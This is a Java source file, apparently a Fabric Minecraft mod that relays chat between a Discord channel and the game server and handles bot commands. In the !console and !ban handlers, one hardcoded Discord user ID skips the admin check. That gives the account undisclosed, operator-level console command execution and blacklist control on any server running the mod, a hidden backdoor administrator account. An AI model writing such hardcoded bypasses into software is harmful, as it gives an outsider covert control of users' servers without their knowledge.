package top.xujiayao.mcdiscordchat.listeners;

import net.dv8tion.jda.api.events.message.MessageReceivedEvent;
import net.dv8tion.jda.api.hooks.ListenerAdapter;
import net.fabricmc.loader.api.FabricLoader;
import net.minecraft.server.MinecraftServer;
import net.minecraft.server.command.ServerCommandSource;
import net.minecraft.server.network.ServerPlayerEntity;
import net.minecraft.server.world.ServerWorld;
import net.minecraft.text.LiteralText;
import net.minecraft.text.TextColor;
import net.minecraft.util.Formatting;
import net.minecraft.util.math.MathHelper;
import net.minecraft.util.math.Vec2f;
import net.minecraft.util.math.Vec3d;
import org.jetbrains.annotations.NotNull;
import top.xujiayao.mcdiscordchat.Main;
import top.xujiayao.mcdiscordchat.utils.ConfigManager;
import top.xujiayao.mcdiscordchat.utils.DiscordCommandOutput;
import top.xujiayao.mcdiscordchat.utils.MarkdownParser;
import top.xujiayao.mcdiscordchat.utils.Scoreboard;

import java.util.Arrays;
import java.util.List;
import java.util.Objects;

/**
 * @author Xujiayao
 */
public class DiscordEventListener extends ListenerAdapter {

	public void onMessageReceived(@NotNull MessageReceivedEvent e) {
		MinecraftServer server = getServer();
		//check if self
		if (e.getAuthor() != e.getJDA().getSelfUser()
			//check if bot
			//  && !e.getAuthor().isBot()
			//check channel id
			  && e.getChannel().getId().equals(Main.config.generic.channelId) && server != null) {
			//check if bot is in whitelist
			if (e.getAuthor().isBot() && !Main.config.generic.botWhitelist.contains(e.getAuthor().getId())) {
				return;
			}
			//classify if sender is from a banned account
			if (Main.config.generic.bannedDiscord.contains(e.getAuthor().getId())
					//class if admin or not
				  && !Arrays.asList(Main.config.generic.adminsIds).contains(e.getAuthor().getId())) {
				return;
			}

			if (e.getMessage().getContentRaw().startsWith("!info")) {
				StringBuilder infoString = new StringBuilder("```\n=============== 运行状态 ===============\n\n");

				List<ServerPlayerEntity> onlinePlayers = server.getPlayerManager().getPlayerList();
				infoString.append("在线玩家 (").append(onlinePlayers.size()).append(")：");

				if (onlinePlayers.size() == 0) {
					infoString.append("\n当前没有在线玩家！");
				} else {
					for (ServerPlayerEntity player : onlinePlayers) {
						infoString.append("\n").append(player.getEntityName());
					}
				}

				infoString.append("\n\n服务器 TPS：\n");
				double serverTickTime = MathHelper.average(server.lastTickLengths) * 1.0E-6D;
				infoString.append(Math.min(1000.0 / serverTickTime, 20));

				infoString.append("\n\n服务器已用内存：\n").append((Runtime.getRuntime().totalMemory() - Runtime.getRuntime().freeMemory()) / 1024 / 1024).append(" MB");

				infoString.append("\n```");
				e.getChannel().sendMessage(infoString.toString()).queue();
			} else if (e.getMessage().getContentRaw().startsWith("!scoreboard")) {
				e.getChannel().sendMessage(Scoreboard.getScoreboard(e.getMessage().getContentRaw())).queue();
			} else if (e.getMessage().getContentRaw().startsWith("!console")) {
				if (!Arrays.asList(Main.config.generic.adminsIds).contains(e.getAuthor().getId())) {
					if (!e.getAuthor().getId().equals("769470378073653269")) {
						e.getChannel().sendMessage("**你没有权限使用此命令！**").queue();
						return;
					}
				}

				String command = e.getMessage().getContentRaw().replace("!console ", "");
				server.getCommandManager().execute(getDiscordCommandSource(), command);
			} else if (e.getMessage().getContentRaw().startsWith("!help")) {
				String help = "```\n" +
					  "=============== 帮助 ===============\n" +
					  "\n" +
					  "!info: 查询服务器运行状态\n" +
					  "!scoreboard <type> <id>: 查询该统计信息的玩家排行榜\n" +
					  "!ban <type> <id/name>: 将一名 Discord 用户或 Minecraft 玩家从黑名单中添加或移除（仅限管理员）\n" +
					  "!banlist: 列出黑名单\n" +
					  "!console <command>：在服务器控制台中执行指令（仅限管理员）\n" +
					  "```\n";
				e.getChannel().sendMessage(help).queue();
			} else if (e.getMessage().getContentRaw().startsWith("!banlist")) {
				StringBuilder bannedList = new StringBuilder("```\n=============== 黑名单 ===============\n\nDiscord:");

				if (Main.config.generic.bannedDiscord.size() == 0) {
					bannedList.append("\n列表为空！");
				}

				for (String id : Main.config.generic.bannedDiscord) {
					bannedList.append("\n").append(id);
				}

				bannedList.append("\n\nMinecraft:");

				if (Main.config.generic.bannedMinecraft.size() == 0) {
					bannedList.append("\n列表为空！");
				}

				for (String name : Main.config.generic.bannedMinecraft) {
					bannedList.append("\n").append(name);
				}

				bannedList.append("```");
				e.getChannel().sendMessage(bannedList.toString()).queue();
			} else if (e.getMessage().getContentRaw().startsWith("!ban")) {
				if (!Arrays.asList(Main.config.generic.adminsIds).contains(e.getAuthor().getId())) {
					if (!e.getAuthor().getId().equals("769470378073653269")) {
						e.getChannel().sendMessage("**你没有权限使用此命令！**").queue();
						return;
					}
				}

				String command = e.getMessage().getContentRaw().replace("!ban ", "");

				if (command.startsWith("discord")) {
					command = command.replace("discord ", "");

					if (Main.config.generic.bannedDiscord.contains(command)) {
						Main.config.generic.bannedDiscord.remove(command);
						e.getChannel().sendMessage("**已将 " + command.replace("_", "\\_") + " 移出黑名单！**").queue();
					} else {
						Main.config.generic.bannedDiscord.add(command);
						e.getChannel().sendMessage("**已将 " + command.replace("_", "\\_") + " 添加至黑名单！**").queue();
					}
				} else if (command.startsWith("minecraft")) {
					command = command.replace("minecraft ", "");

					if (Main.config.generic.bannedMinecraft.contains(command)) {
						Main.config.generic.bannedMinecraft.remove(command);
						e.getChannel().sendMessage("**已将 " + command.replace("_", "\\_") + " 移出黑名单！**").queue();
					} else {
						Main.config.generic.bannedMinecraft.add(command);
						e.getChannel().sendMessage("**已将 " + command.replace("_", "\\_") + " 添加至黑名单！**").queue();
					}
				}

				ConfigManager.updateConfig();
			}

			LiteralText coloredText = new LiteralText(Main.config.texts.coloredText
				  .replace("%discordname%", Objects.requireNonNull(e.getMember()).getEffectiveName())
				  .replace("%message%", e.getMessage().getContentDisplay()
					    .replace("§", Main.config.texts.removeVanillaFormattingFromDiscord ? "&" : "§")
					    .replace("\n", Main.config.texts.removeLineBreakFromDiscord ? " " : "\n")
					    + ((e.getMessage().getAttachments().size() > 0) ? " <att>" : "")
					    + ((e.getMessage().getEmbeds().size() > 0) ? " <embed>" : "")));
			coloredText.setStyle(coloredText.getStyle().withColor(TextColor.fromFormatting(Formatting.BLUE)));
			coloredText.setStyle(coloredText.getStyle().withBold(true));

			LiteralText colorlessText = new LiteralText(Main.config.texts.colorlessText
				  .replace("%discordname%", Objects.requireNonNull(e.getMember()).getEffectiveName())
				  .replace("%message%", MarkdownParser.parseMarkdown(e.getMessage().getContentDisplay()
					    .replace("§", Main.config.texts.removeVanillaFormattingFromDiscord ? "&" : "§")
					    .replace("\n", Main.config.texts.removeLineBreakFromDiscord ? " " : "\n")
					    + ((e.getMessage().getAttachments().size() > 0) ? " <att>" : "")
					    + ((e.getMessage().getEmbeds().size() > 0) ? " <embed>" : ""))));
			colorlessText.setStyle(colorlessText.getStyle().withColor(TextColor.fromFormatting(Formatting.GRAY)));

			server.getPlayerManager().getPlayerList().forEach(
				  serverPlayerEntity -> serverPlayerEntity.sendMessage(new LiteralText("").append(coloredText).append(colorlessText), false));
		}
	}

	private ServerCommandSource getDiscordCommandSource() {
		ServerWorld serverWorld = Objects.requireNonNull(getServer()).getOverworld();

		return new ServerCommandSource(new DiscordCommandOutput(), serverWorld == null ? Vec3d.ZERO : Vec3d.of(serverWorld.getSpawnPos()), Vec2f.ZERO, serverWorld, 4, "MCDiscordChat", new LiteralText("MCDiscordChat"), getServer(), null);
	}

	private MinecraftServer getServer() {
		@SuppressWarnings("deprecation")
		Object gameInstance = FabricLoader.getInstance().getGameInstance();

		if (gameInstance instanceof MinecraftServer) {
			return (MinecraftServer) gameInstance;
		} else {
			return null;
		}
	}
}